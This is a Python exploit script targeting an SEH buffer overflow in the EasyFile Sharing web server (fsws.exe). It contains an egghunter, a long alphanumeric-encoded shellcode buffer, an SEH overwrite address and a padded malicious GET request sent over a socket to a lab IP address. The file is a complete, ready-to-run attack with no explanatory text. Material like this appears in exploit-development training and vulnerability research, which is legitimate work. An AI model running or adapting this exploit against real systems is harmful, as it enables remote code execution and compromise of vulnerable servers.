#!/usr/bin/python
import socket
import os
import sys


# 0x1001ad53 in fsws.exe for SEH
egg = "w00tw00t"
egghunter = ""
egghunter +="\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egghunter +="\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"


buf =  ""
buf += "\xdb\xd1\xd9\x74\x24\xf4\x5d\x55\x59\x49\x49\x49\x49"
buf += "\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x43\x37"
buf += "\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41"
buf += "\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
buf += "\x50\x38\x41\x42\x75\x4a\x49\x4b\x4c\x79\x78\x6e\x62"
buf += "\x63\x30\x55\x50\x57\x70\x73\x50\x4b\x39\x49\x75\x64"
buf += "\x71\x6b\x70\x62\x44\x6c\x4b\x56\x30\x66\x50\x6e\x6b"
buf += "\x76\x32\x34\x4c\x4e\x6b\x61\x42\x77\x64\x6c\x4b\x42"
buf += "\x52\x74\x68\x64\x4f\x4d\x67\x71\x5a\x75\x76\x74\x71"
buf += "\x69\x6f\x4c\x6c\x65\x6c\x30\x61\x31\x6c\x57\x72\x66"
buf += "\x4c\x47\x50\x4f\x31\x68\x4f\x44\x4d\x46\x61\x5a\x67"
buf += "\x69\x72\x7a\x52\x63\x62\x52\x77\x6e\x6b\x70\x52\x54"
buf += "\x50\x4e\x6b\x53\x7a\x65\x6c\x4e\x6b\x70\x4c\x32\x31"
buf += "\x70\x78\x4b\x53\x52\x68\x35\x51\x6b\x61\x42\x71\x4e"
buf += "\x6b\x42\x79\x37\x50\x73\x31\x7a\x73\x4c\x4b\x72\x69"
buf += "\x64\x58\x38\x63\x35\x6a\x72\x69\x4e\x6b\x47\x44\x6e"
buf += "\x6b\x76\x61\x48\x56\x34\x71\x39\x6f\x6e\x4c\x39\x51"
buf += "\x6a\x6f\x56\x6d\x53\x31\x6a\x67\x46\x58\x79\x70\x43"
buf += "\x45\x58\x76\x75\x53\x61\x6d\x68\x78\x45\x6b\x31\x6d"
buf += "\x51\x34\x74\x35\x4d\x34\x50\x58\x6c\x4b\x42\x78\x64"
buf += "\x64\x73\x31\x69\x43\x52\x46\x4c\x4b\x74\x4c\x70\x4b"
buf += "\x6e\x6b\x36\x38\x67\x6c\x63\x31\x6a\x73\x6c\x4b\x43"
buf += "\x34\x4e\x6b\x36\x61\x58\x50\x4e\x69\x42\x64\x61\x34"
buf += "\x77\x54\x61\x4b\x43\x6b\x65\x31\x42\x79\x32\x7a\x56"
buf += "\x31\x39\x6f\x49\x70\x31\x4f\x53\x6f\x32\x7a\x6c\x4b"
buf += "\x75\x42\x48\x6b\x4e\x6d\x53\x6d\x61\x78\x45\x63\x75"
buf += "\x62\x35\x50\x43\x30\x30\x68\x52\x57\x71\x63\x57\x42"
buf += "\x33\x6f\x52\x74\x30\x68\x30\x4c\x71\x67\x47\x56\x43"
buf += "\x37\x59\x6f\x79\x45\x4f\x48\x4a\x30\x45\x51\x45\x50"
buf += "\x63\x30\x51\x39\x4f\x34\x62\x74\x46\x30\x53\x58\x56"
buf += "\x49\x4b\x30\x70\x6b\x33\x30\x6b\x4f\x49\x45\x30\x50"
buf += "\x72\x70\x62\x70\x72\x70\x61\x50\x32\x70\x53\x70\x46"
buf += "\x30\x32\x48\x49\x7a\x36\x6f\x39\x4f\x79\x70\x59\x6f"
buf += "\x4b\x65\x4d\x47\x51\x7a\x54\x45\x32\x48\x69\x50\x79"
buf += "\x38\x37\x48\x70\x65\x55\x38\x55\x52\x43\x30\x71\x45"
buf += "\x43\x59\x4e\x69\x49\x76\x62\x4a\x62\x30\x32\x76\x56"
buf += "\x37\x65\x38\x4a\x39\x4c\x65\x63\x44\x51\x71\x49\x6f"
buf += "\x48\x55\x6b\x35\x6b\x70\x30\x74\x76\x6c\x49\x6f\x70"
buf += "\x4e\x36\x68\x62\x55\x48\x6c\x73\x58\x38\x70\x4e\x55"
buf += "\x4e\x42\x43\x66\x49\x6f\x48\x55\x30\x68\x75\x33\x52"
buf += "\x4d\x65\x34\x75\x50\x6c\x49\x7a\x43\x51\x47\x63\x67"
buf += "\x43\x67\x64\x71\x69\x66\x53\x5a\x42\x32\x61\x49\x70"
buf += "\x56\x48\x62\x39\x6d\x42\x46\x49\x57\x70\x44\x46\x44"
buf += "\x45\x6c\x77\x71\x56\x61\x4e\x6d\x52\x64\x44\x64\x54"
buf += "\x50\x68\x46\x57\x70\x57\x34\x70\x54\x56\x30\x61\x46"
buf += "\x72\x76\x31\x46\x53\x76\x51\x46\x30\x4e\x71\x46\x70"
buf += "\x56\x73\x63\x56\x36\x50\x68\x53\x49\x6a\x6c\x45\x6f"
buf += "\x6c\x46\x59\x6f\x7a\x75\x6e\x69\x4d\x30\x42\x6e\x62"
buf += "\x76\x77\x36\x6b\x4f\x46\x50\x43\x58\x44\x48\x4d\x57"
buf += "\x45\x4d\x73\x50\x79\x6f\x78\x55\x4f\x4b\x48\x70\x48"
buf += "\x35\x6f\x52\x36\x36\x53\x58\x6c\x66\x4c\x55\x6f\x4d"
buf += "\x6d\x4d\x4b\x4f\x58\x55\x45\x6c\x76\x66\x63\x4c\x36"
buf += "\x6a\x4f\x70\x6b\x4b\x6b\x50\x33\x45\x65\x55\x6f\x4b"
buf += "\x37\x37\x76\x73\x72\x52\x70\x6f\x33\x5a\x63\x30\x73"
buf += "\x63\x69\x6f\x78\x55\x41\x41"


crash = ("\x41" * (4065 - 4 - len(buf) - 8) )  + egg + buf  + "\x90\x90\xeb\x06" + "\x53\xad\x01\x10" + ("\x90" * 10) + egghunter + ("\x44" * (5000 - 4065 - 4 -4 - 10  - len(egghunter)))
buffer="GET " + crash #+ " HTTP/1.1\r\n\r\n"
buffer+="Host: 192.168.56.102:80\r\n"
buffer+="Content-Type: application/x-www-form-urlencoded\r\n"
buffer+="User-Agent: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_03\r\n"
buffer+="Content-Length: 1048580\r\n\r\n"
print "[*] Sending evil HTTP request to EasyFile Sharing"
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("192.168.56.102", 80))
expl.send(buffer)
expl.close()
